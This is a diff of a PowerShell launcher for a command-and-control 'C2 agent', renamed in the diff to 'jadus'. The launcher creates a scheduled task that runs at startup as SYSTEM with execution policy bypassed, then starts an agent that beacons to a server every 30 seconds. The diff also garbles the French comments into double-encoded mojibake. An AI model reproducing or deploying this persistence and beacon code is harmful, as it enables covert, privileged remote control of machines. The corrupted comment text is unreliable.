@@ -1,31 +1,31 @@
-#Requires -Version 5.0
+﻿#Requires -Version 5.0
 #Requires -RunAsAdministrator
 
 <#
 .SYNOPSIS
-    Launcher script pour l'agent C2
-    Exécute agent_active.ps1 avec les paramètres injectés lors du build
+    Launcher script pour l'agent jadus
+    ExÃ©cute agent_active.ps1 avec les paramÃ¨tres injectÃ©s lors du build
 
 .DESCRIPTION
     Ce script :
-    - Exécute l'agent principal avec les paramètres pré-configurés
-    - Les paramètres sont injectés lors de la compilation du MSI
-    - Gère les logs structurés
-    - S'assure que la tâche planifiée existe
+    - ExÃ©cute l'agent principal avec les paramÃ¨tres prÃ©-configurÃ©s
+    - Les paramÃ¨tres sont injectÃ©s lors de la compilation du MSI
+    - GÃ¨re les logs structurÃ©s
+    - S'assure que la tÃ¢che planifiÃ©e existe
 
 .NOTES
-    Ce script doit être exécuté en tant qu'administrateur
-    Les paramètres sont injectés lors du build via build-msi.ps1
+    Ce script doit Ãªtre exÃ©cutÃ© en tant qu'administrateur
+    Les paramÃ¨tres sont injectÃ©s lors du build via build-msi.ps1
 #>
 
 $ErrorActionPreference = "Stop"
 
-# ===== PARAMÈTRES INJECTÉS LORS DU BUILD =====
-# Les valeurs suivantes sont remplacées par build-msi.ps1
+# ===== PARAMÃˆTRES INJECTÃ‰S LORS DU BUILD =====
+# Les valeurs suivantes sont remplacÃ©es par build-msi.ps1
 # lors de la compilation du MSI
 $serverUrl = "http://localhost:8000/api"
 $beaconInterval = 30
-$logFilePath = "C:\Program Files\C2Agent\logs\agent.log"
+$logFilePath = "C:\Program Files\jadusAgent\logs\agent.log"
 # ============================================
 
 # Fonctions utilitaires
@@ -50,7 +50,7 @@ function Write-Log {
     
     Write-Host $logEntry -ForegroundColor $color
     
-    # Écriture dans fichier
+    # Ã‰criture dans fichier
     if ($LogFile -and (Test-Path (Split-Path -Path $LogFile))) {
         Add-Content -Path $LogFile -Value $logEntry
     }
@@ -62,17 +62,17 @@ function Ensure-ScheduledTask {
         [string]$LogFilePath
     )
     
-    # NOTE: La tâche planifiée devrait être créée par la Custom Action du MSI pendant l'installation.
-    # Cette fonction est un fallback au cas où :
-    # - La Custom Action aurait échoué
-    # - Le script est exécuté manuellement ou via d'autres moyens
-    # - La tâche aurait été supprimée
+    # NOTE: La tÃ¢che planifiÃ©e devrait Ãªtre crÃ©Ã©e par la Custom Action du MSI pendant l'installation.
+    # Cette fonction est un fallback au cas oÃ¹ :
+    # - La Custom Action aurait Ã©chouÃ©
+    # - Le script est exÃ©cutÃ© manuellement ou via d'autres moyens
+    # - La tÃ¢che aurait Ã©tÃ© supprimÃ©e
     
-    $taskName = "C2AgentBeacon"
+    $taskName = "jadusAgentBeacon"
     
     Write-Log "Checking scheduled task: $taskName" "INFO" $LogFilePath
     
-    # Vérifier si la tâche existe
+    # VÃ©rifier si la tÃ¢che existe
     $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
     
     if ($existingTask) {
@@ -83,15 +83,15 @@ function Ensure-ScheduledTask {
     Write-Log "Scheduled task does not exist, creating it (FALLBACK)..." "WARNING" $LogFilePath
     
     try {
-        # Créer l'action
+        # CrÃ©er l'action
         $action = New-ScheduledTaskAction `
             -Execute "powershell.exe" `
             -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$LauncherPath`""
         
-        # Créer le trigger (au démarrage de l'ordinateur)
+        # CrÃ©er le trigger (au dÃ©marrage de l'ordinateur)
         $trigger = New-ScheduledTaskTrigger -AtStartup
         
-        # Paramètres de la tâche
+        # ParamÃ¨tres de la tÃ¢che
         $settings = New-ScheduledTaskSettingsSet `
             -AllowStartIfOnBatteries `
             -DontStopIfGoingOnBatteries `
@@ -99,7 +99,7 @@ function Ensure-ScheduledTask {
             -RunOnlyIfNetworkAvailable `
             -MultipleInstances IgnoreNew
         
-        # Créer la tâche
+        # CrÃ©er la tÃ¢che
         $task = Register-ScheduledTask `
             -TaskName $taskName `
             -Action $action `
@@ -107,12 +107,12 @@ function Ensure-ScheduledTask {
             -Settings $settings `
             -RunLevel Highest `
             -User "SYSTEM" `
-            -Description "C2 Autonomous Agent - Beacon execution" `
+            -Description "jadus Autonomous Agent - Beacon execution" `
             -ErrorAction Stop
         
-        Write-Log "✅ Scheduled task created successfully" "SUCCESS" $LogFilePath
+        Write-Log "âœ… Scheduled task created successfully" "SUCCESS" $LogFilePath
         
-        # Test d'exécution
+        # Test d'exÃ©cution
         Write-Log "Starting scheduled task for verification..." "INFO" $LogFilePath
         Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
         
@@ -128,11 +128,11 @@ function Ensure-ScheduledTask {
 
 Write-Host ""
 Write-Host "========================================================" -ForegroundColor Cyan
-Write-Host "        C2 AGENT - Launcher" -ForegroundColor Cyan
+Write-Host "        jadus AGENT - Launcher" -ForegroundColor Cyan
 Write-Host "========================================================" -ForegroundColor Cyan
 Write-Host ""
 
-# Créer le répertoire des logs s'il n'existe pas
+# CrÃ©er le rÃ©pertoire des logs s'il n'existe pas
 $logDir = Split-Path -Parent -Path $logFilePath
 
 if (-not (Test-Path -Path $logDir)) {
@@ -151,7 +151,7 @@ Write-Log "Server URL: $serverUrl" "INFO" $logFilePath
 Write-Log "Beacon Interval: $beaconInterval seconds" "INFO" $logFilePath
 Write-Log "Log File: $logFilePath" "INFO" $logFilePath
 
-# Vérifier que le script agent existe
+# VÃ©rifier que le script agent existe
 $agentScriptPath = "$PSScriptRoot\agent_active.ps1"
 
 if (-not (Test-Path -Path $agentScriptPath)) {
@@ -161,14 +161,14 @@ if (-not (Test-Path -Path $agentScriptPath)) {
 
 Write-Log "Starting agent..." "INFO" $logFilePath
 
-# Vérifier et créer la tâche planifiée si nécessaire (fallback)
+# VÃ©rifier et crÃ©er la tÃ¢che planifiÃ©e si nÃ©cessaire (fallback)
 $taskReady = Ensure-ScheduledTask -LauncherPath $PSCommandPath -LogFilePath $logFilePath
 
 if (-not $taskReady) {
     Write-Log "Warning: Scheduled task could not be created or verified" "WARNING" $logFilePath
 }
 
-# Exécuter l'agent avec les paramètres injectés
+# ExÃ©cuter l'agent avec les paramÃ¨tres injectÃ©s
 try {
     & $agentScriptPath `
         -ServerUrl $serverUrl `
@@ -179,3 +179,4 @@ catch {
     Write-Log "Agent execution failed: $_" "ERROR" $logFilePath
     exit 1
 }
+
